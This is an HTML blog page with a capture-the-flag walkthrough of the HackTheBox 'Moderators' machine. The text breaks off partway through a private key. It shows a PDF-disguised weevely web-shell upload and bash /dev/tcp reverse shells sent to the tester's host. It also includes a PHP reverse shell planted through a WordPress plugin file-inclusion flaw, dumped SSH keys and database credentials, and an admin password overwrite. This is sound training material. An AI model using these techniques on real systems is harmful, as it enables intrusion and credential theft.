@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html>
+<div id="particles-js">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!--  Essential META Tags -->
+<meta property="og:title" content="Moderators HackTheBox Writeup">
+<meta name="description" content="Moderators HackTheBox Writeup | 0xv01d">
+<meta property="og:type" content="article" />
+<meta property="og:image" content="/images/HTB/moderators/moderators_card.png">
+<meta property="og:url" content="https://0xv01d.github.io/hackthebox/moderators">
+<meta name="twitter:card" content="/images/HTB/moderators/moderators_card.png">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/Scripts/js/particles.js"></script>
+    <script src="/Scripts/js/app.js"></script>
+<title>Moderators HackTheBox Writeup | 0xv01d</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json">
+</script>
+
+    <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/moderators/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+      <header class="app-header">
+        <a href="https:0xv01d.github.io">
+          <img class="avatar" src="/images/index/avatar.png">
+		</a><p></p>
+		<h1><strong>0xv01d</strong></h1>
+		<nav class="app-header-menu">
+			<a class="app-header-menu-item" href="/">Home</a>
+             - 
+			<a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+			<a class="app-header-menu-item" href="/about/">About</a>
+		</nav>
+		<p>Just another computer adict.</p>
+		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
+			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
+			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
+			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
+			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
+		</div>
+        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+        </a>
+        <div style="height: 7rem;"></div>
+      </header>
+
+      <main class="app-container">
+		
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Moderators Walkthrough</div>			
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">IDOR</a>
+				<a class="tag" href="#">Fuzzing</a>
+				<a class="tag" href="#">PHP</a>
+				<a class="tag" href="#">LFI</a>
+				<a class="tag" href="#">RCE</a>
+				<a class="tag" href="#">Port Forwarding</a>
+				<a class="tag" href="#">Wordpress</a>
+				<a class="tag" href="#">SSH</a>
+				<a class="tag" href="#">MySQL</a>
+				<a class="tag" href="#">VirtualBox</a>
+				<a class="tag" href="#">LUKS</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" style="max-width: 597px;" src="/images/HTB/moderators/moderators_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Moderators Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Moderators" rel="noreferrer noopener" target="_blank">Moderators</a> machine on HackTheBox, submitted by
+			<a href="https://app.hackthebox.com/users/389926" rel="noreferrer noopener" target="_blank">kavigihan</a>. The machine starts with a "bit" of web enumeration, which lead us to a file upload page
+			in which we need to bypass some filters to get a shell, once we're in we discover a wordpress vulnerable plugin which we can abuse to pivot to another user.
+			From there we find some mysql credentials in the wordpress config, wich we can use to change the password and login at the wp-admin web, and get the ssh key from the last user,
+			eventually we find an encrypted vbox image which, after crack it and mount it, we can get the password of the user who has full sudoers privileges.
+
+<!--Machine Resolution-->
+			<h1 id="header-1">Recon</h1>
+
+  	          <p class="head-img">As always let's start with a portscan, we only have port 22 and 80 open, according to the openssh version it's a focal ubuntu, we also have an apache server, and there isn't much more</p>
+            <img class="img-post" style="max-width: 1271px;" src="/images/HTB/moderators/nmap.png">
+
+			<p class="head-img">Basically the same after running whatweb, let's start by enumerating some directories</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> whatweb </span>http://10.10.11.173
+<span class="x">http://10.10.11.173</span> [200 OK] Apache[<span class="kt"> 2.4.41</span>], Bootstrap[<span class="kt"> 3.3.7</span>], Country[RESERVED][<span class="kt"> ZZ</span>], Frame, HTTPServer[<span class="gd"> Ubuntu Linux</span>][<span class="kt"> Apache/2.4.41 (Ubuntu)</span>], IP[<span class="x"> 10.10.11.173</span<], JQuery[<span class="kt">3.2.1</span>], Script, Title[<span class="k"> Moderators</span>]
+</span>	</code></pre></div></div>
+
+			<p class="head-img">We have some interesting ones where to start</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> gobuster </span>dir --no-error -t 200 -u http://10.10.11.173 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.173
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/11/04 19:54:22 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 313] [--> http://10.10.11.173/images/]
+/about.php            (Status: 200) [Size: 11539]                                
+/blog.php             (Status: 200) [Size: 13163]                                
+/index.php            (Status: 200) [Size: 11150]                                
+/contact.php          (Status: 200) [Size: 10084]                                
+/reports.php          (Status: 302) [Size: 7888] [--> index.php]                 
+/service.php          (Status: 200) [Size: 9411]                                 
+/css                  (Status: 301) [Size: 310] [--> http://10.10.11.173/css/]   
+/logs                 (Status: 301) [Size: 311] [--> http://10.10.11.173/logs/]  
+/server-status        (Status: 403) [Size: 277]                                  
+/send_mail.php        (Status: 302) [Size: 0] [--> /contact.php?msg=Email sent]  
+                                                                                 
+===============================================================
+2022/11/04 19:59:44 Finished
+===============================================================
+</span> </code></pre></div></div>
+
+			<p class="head-img">In blog.php we find some posts about vulnerabilities, in some of them we can find a report and its id, we can fuzz to see if there are some other that doesn't appear on the web</p>
+			<img class="img-post" style="max-width: 423px;" src="/images/HTB/moderators/reports.png"></img>
+
+
+            <p class="head-img">Once we create our dictionary, and fuzz, we find six results, but only the 9798 is slightly different, it adds what appears to be a md5 hash</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="k">for</span> i in <span class="s">$(</span><span class="kt">seq</span> 1 9999<span class="s">)</span>; <span class="k">do</span> <span class="kt">echo</span> $i >> number.report; <span class="k">done</span>
+
+<span class="na">❯ </span><span class="kt">wfuzz </span> -c --hc=404,403 --hw=417 -t 200 -u <span class="k">"http://10.10.11.173/reports.php?report=FUZZ"</span> -w number.report
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.173/reports.php?report=FUZZ
+Total requests: 9999
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                           
+=====================================================================
+
+000002589:   <span class="na">200</span>        274 L    523 W      9786 Ch     "2589"                                                                            
+000003478:   <span class="na">200</span>        275 L    526 W      9831 Ch     "3478"                                                                            
+000004221:   <span class="na">200</span>        273 L    523 W      9880 Ch     "4221"                                                                            
+000007612:   <span class="na">200</span>        275 L    523 W      9790 Ch     "7612"                                                                            
+000008121:   <span class="na">200</span>        273 L    522 W      9784 Ch     "8121"                                                                            
+000009798:   <span class="na">200</span>        276 L    525 W      9887 Ch     "9798"                                                                            
+
+Total time: 58.5868
+Processed Requests: 9999
+Filtered Requests: 9993
+Requests/sec.: 170.76441
+
+<span class="na">❯ </span><span class="kt">curl</span> -s <span class="k">"http://10.10.11.173/reports.php?report=9798"</span> | <span class="kt">html2text</span> | <span class="kt">grep</span> <span class="k">"Report"</span> -A 9
+Report #9798
+# Disclosure Information [+] Domain : bethebest101.uk.htb
+[+] Vulnerability : Sensitive Information Disclosure
+[+] Impact : 3.5/4.0
+[+] Disclosed by : Karlos Young
+[+] Disclosed on : 11/19/2021
+[+] Posted on :
+[+] Approved :
+[+] Patched : NO
+[+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">After crack it with john we see it correspond to the number of report, lets try to fuzz using the hashes, and see if we can get a log file</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">john </span>-w:/usr/share/wordlists/rockyou.txt hash --format=RAW-md5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+No password hashes left to crack (see FAQ)
+
+<span class="na">❯ </span><span class="kt">john</span> --show hash --format=RAW-md5
+?:9798
+
+1 password hash cracked, 0 left
+</span> </code></pre></div></div>
+
+            <p class="head-img">We have some hashes with a good response, after try the first we have a log.pdf</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">wfuzz </span>-c -z range,0-9999,md5 -u "http://10.10.11.173/logs/FUZZ/" --hh 274
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.173/logs/FUZZ/
+Total requests: 10000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                          
+=====================================================================
+
+000002590:   200        0 L      0 W        0 Ch        "743c41a921516b04afde48bb48e28ce6"                                               
+000003479:   200        0 L      0 W        0 Ch        "b071cfa81605a94ad80cfa2bbc747448"                                               
+000004222:   200        0 L      0 W        0 Ch        "74d90aafda34e6060f9e8433962d14fd"                                               
+000007613:   200        0 L      0 W        0 Ch        "ce5d75028d92047a9ec617acb9c34ce6"                                               
+000008122:   200        0 L      0 W        0 Ch        "afecc60f82be41c1b52f6705ec69e0f1"                                               
+000009799:   200        0 L      0 W        0 Ch        "e21cece511f43a5cb18d4932429915ed"                                               
+
+Total time: 195.5393
+Processed Requests: 10000
+Filtered Requests: 9994
+Requests/sec.: 51.14059
+</span> </code></pre></div></div>
+
+            <p class="head-img">After read the pdf, we can see there is a php page where we can uploads files</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">curl </span>-sO http://10.10.11.173/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf
+
+<span class="na">❯ </span><span class="kt">pdftotext</span> -raw -enc UTF-8 logs.pdf - | <span class="kt">less</span>
+
+1/1
+Logs
+[01/30/2021] Log file created for report #2589.
+[01/30/2021] Report submitted by Sharaf Ahamed.
+[02/03/2021] Report accepted.
+[02/03/2021] LOG file uploaded from /logs/report_log_upload.php
+[02/04/2021] Reported to the site administrators.
+[02/05/2021] Posting approval sent to the owners.
+[02/07/2021] Approval pending......
+^L
+(END)
+</span> </code></pre></div></div>
+
+            <p class="head-img">But first let's enumerate a bit deeper to be sure we don't miss anything</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">ffuf </span>-fc 404,301 -c -t 200 -recursion -u http://10.10.11.173/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.4.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.173/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response status: 404,301
+________________________________________________
+
+[INFO] Adding a new job to the queue: http://10.10.11.173/images/FUZZ
+[INFO] Adding a new job to the queue: http://10.10.11.173/css/FUZZ
+[INFO] Adding a new job to the queue: http://10.10.11.173/logs/FUZZ
+[INFO] Starting queued job on target: http://10.10.11.173/images/FUZZ
+[INFO] Adding a new job to the queue: http://10.10.11.173/images/blog/FUZZ
+[INFO] Starting queued job on target: http://10.10.11.173/css/FUZZ
+[INFO] Starting queued job on target: http://10.10.11.173/logs/FUZZ
+[INFO] Adding a new job to the queue: http://10.10.11.173/logs/uploads/FUZZ
+[INFO] Adding a new job to the queue: http://10.10.11.173/logs/css/FUZZ
+[INFO] Starting queued job on target: http://10.10.11.173/images/blog/FUZZ
+[INFO] Starting queued job on target: http://10.10.11.173/logs/uploads/FUZZ
+[INFO] Starting queued job on target: http://10.10.11.173/logs/css/FUZZ
+
+:: Progress: [220560/220560] :: Job [7/7] :: 2045 req/sec :: Duration: [0:02:39] :: Errors: 0 ::
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once on the page, I tried to upload the pdf that we got before, but it doesn't seem to accept it, let's pass it through burp to see how it is processed</p>
+            <img class="img-post" style="max-width: 463px;" src="/images/HTB/moderators/upload_file.png"></img>
+
+            <p class="head-img">Apparently, in order for the request to be processed, we must add the pdf magic bits and add a .pdf extension to the file name, together with .php so that the code can be interpreted, although it doesn't seem that is has been processed if we make the request by curl we can confirm it</p>
+            <img class="img-post" style="max-width: 1084px;" src="/images/HTB/moderators/upload_test.png"></img>
+
+            <p class="head-img">After trying to get a shell and inspecting the <a href="https://pastebin.com/P2y86GZi" rel="noreferrer noopener" target="_blank">disabled functions</a>, we realized that functions like system, or exec are disabled, let's change our payload, we can use <a href="https://github.com/epinna/weevely3/wiki/Install" rel="noreferrer noopener" target="_blank">weevely</a> which is useful for bypass filter checks</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">curl </span>-s 'http://10.10.11.173/logs/uploads/disabl_func.pdf.php'
+%PDF-1.5
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,passthru,system,exec,shell_exec
+%%EOF
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's generate the shell agent and copy it to make the request, once the file is uploaded, we can connect to the agent, and we are in</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> weevely </span>generate shell shell.pdf.php
+Generated 'shell.pdf.php' with password 'shell' of 677 byte size.
+<span class="na">❯</span><span class="kt"> cat </span>shell.pdf.php | xclip -sel clip
+</span> </code></pre></div></div>
+
+            <p class="head-img"></p>
+            <img class="img-post" style="max-width: 781px;" src="/images/HTB/moderators/shell.png"></img>
+
+            <p class="head-img">Let's send us a reverse shell to be more comfortable</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">weevely </span>http://10.10.11.173/logs/uploads/shell.pdf.php shell
+
+[+] Target:	10.10.11.173
+
+weevely> whoami
+www-data
+<span class="k">www-data@moderators:/var/www/html/logs/uploads $</span> bash -c 'bash -i >& /dev/tcp/10.10.16.50/443 0>&1'
+</span> </code></pre></div></div>
+
+            <p class="head-img">After a bit of enumeration we found a script running as lexi, and a site running on localhost on port 8080</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">www-data@moderators:/var/www/html/logs$</span> ps aux | grep lexi
+root         828  0.0  0.0   8368  3668 ?        Ss   Nov04   0:00 /usr/sbin/runuser -u lexi /usr/local/sbin/startup.sh
+lexi         883  0.0  0.0   2608   596 ?        S    Nov04   0:00 /bin/sh /usr/local/sbin/startup.sh
+lexi         884  0.0  0.7 228360 31672 ?        S    Nov04   0:05 /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
+www-data   10882  0.0  0.0   3304   652 pts/0    S+   21:08   0:00 grep lexi
+<span class="k">www-data@moderators:/var/www/html/logs$ </span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">We apply port forwarding with <a href="https://github.com/jpillora/chisel/releases" rel="noreferrer noopener" target="_blank">chisel</a> to pass port 8080 to local, and now we can see what is on the web</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">./chisel </span>server --reverse --port 9999
+2022/11/05 17:33:48 server: Reverse tunnelling enabled
+2022/11/05 17:33:48 server: Fingerprint 9pIHCREx+YC4mOb7HYXG/WhowbuVC3RVADKc1y5A/oI=
+2022/11/05 17:33:48 server: Listening on http://0.0.0.0:9999
+2022/11/05 17:34:19 server: session#1: tun: proxy#R:8080=>8080: Listening
+
+<span class="k">www-data@moderators:/dev/shm$</span> ./chisel client 10.10.16.50:9999 R:8080:127.0.0.1:8080
+2022/11/05 21:34:04 client: Connecting to ws://10.10.16.50:9999
+2022/11/05 21:34:05 client: Connected (Latency 89.177788ms)
+</span> </code></pre></div></div>
+
+            <p class="head-img">There is nothing useful on the main page but since it is wordpress and mysql is running we could try to get credentials to log in at /wp-admin/</p>
+            <img class="img-post" style="max-width: 390px;" src="/images/HTB/moderators/wp-login.png"></img>
+
+            <p class="head-img">With some enum of the site, we can figure out that it is vulnerable to LFI at this path /opt/site.new/wp-content/plugins</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">searchsploit </span>brandfolder
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin <span class="gd">Brandfolder</span> 3.0 - Local/Remote File Inclusion                                                   | php/webapps/39591.txt
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</span> </code></pre></div></div>
+
+            <p class="head-img">So, we go to a writable directory, as the callback.php is going to request wp-load.php, we are going to save our reverse shell with that name</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">www-data@moderators:/var/www/html/logs/uploads$</span> cd /dev/shm/
+<span class="k">www-data@moderators:/dev/shm $</span> echo -n <span>"<</span>?php echo fread(popen("<span>bash -c 'bash -i >& /dev/tcp/10.10.16.50/4444 0>&1'", "r"), 4096);; ?>" > wp-load.php
+</span> </code></pre></div></div>
+
+            <p class="head-img">We just have to make the request</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">curl </span>-v "http://localhost:8080//wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/"
+
+<span class="na">❯ </span><span class="ld"><span class="kt">sudo nc </span>-nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.50] from (UNKNOWN) [10.10.11.173] 44164
+<span class="k">lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$</span> whoami
+lexi
+<span class="k">lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$</span> 
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once in, let's read his id_rsa to get some persistenece, it even comes in handy to do local port forwarding through ssh</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span><span class="k">lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$</span> cat /home/lexi/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+<span class="k">lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ </span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">You can forward the port via ssh or just upload chisel again, we can also read the user flag</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">ssh </span>-i lexi.id_rsa lexi@10.10.11.173 -L 8000:localhost:8080
+
+<span class="k">lexi@moderators:~$</span> cat user.txt
+934a2af370034c61f99884a215b97f10
+<span class="k">lexi@moderators:~$</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">After some digging in the wordpress directory we found mysql credentials</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">lexi@moderators:~$</span> cat /opt/site.new/wp-config.php | grep -E 'user|password'
+/** MySQL database username */
+define( 'DB_USER', <span class="gd">'wordpressuser</span>' );
+/** MySQL database password */
+define( 'DB_PASSWORD', <span class="gd">'wordpresspassword123!!</span>' );
+ * This will force all users to have to log in again.
+<span class="k">lexi@moderators:~$ </span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once we log in, the wp_pms_passwords table seems to be the password manager, but the passwords are encrypted, we could try changing the admin password using the wp_users table to login to the web</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld">MariaDB [wordpress]> select * from wp_users\G;
+*************************** 1. row ***************************
+                 ID: 1
+         user_login: admin
+          user_pass: $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0
+      user_nicename: admin
+         user_email: admin@moderators.htb
+           user_url: http://192.168.1.4:8080
+    user_registered: 2021-09-11 05:30:20
+user_activation_key: 
+        user_status: 0
+       display_name: admin
+*************************** 2. row ***************************
+                 ID: 2
+         user_login: lexi
+          user_pass: $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461
+      user_nicename: lexi
+         user_email: lexi@moderators.htb
+           user_url: 
+    user_registered: 2021-09-12 16:51:16
+user_activation_key: 
+        user_status: 0
+       display_name: lexi
+2 rows in set (0.001 sec)
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">We generate a hash</p>                                                      
+            <img class="img-post" style="max-width: 850px;" src="/images/HTB/moderators/wp_hash.png"></img>
+
+            <p class="head-img">And update the table</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld">MariaDB [<span class="kt">wordpress</span>]> update wp_users set user_pass = '$P$B6nLufIS/4CT1THK4MpPrq.F97JH/E0' where id=1;
+Query OK, 1 row affected (0.002 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MariaDB [<span class="kt">wordpress</span>]> 
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once in, we can read john's ssh key, also Carls password</p>
+            <img class="img-post" style="max-width: 1191px;" src="/images/HTB/moderators/wp-passwords.png"></img>
+
+            <p class="head-img">John's ssh key</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">cat </span>john.id_rsa
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAn/Neot2K7OKlkda5TCHoWwP5u1hHhBwKzM0LN3hn7EwyXshgj9G+
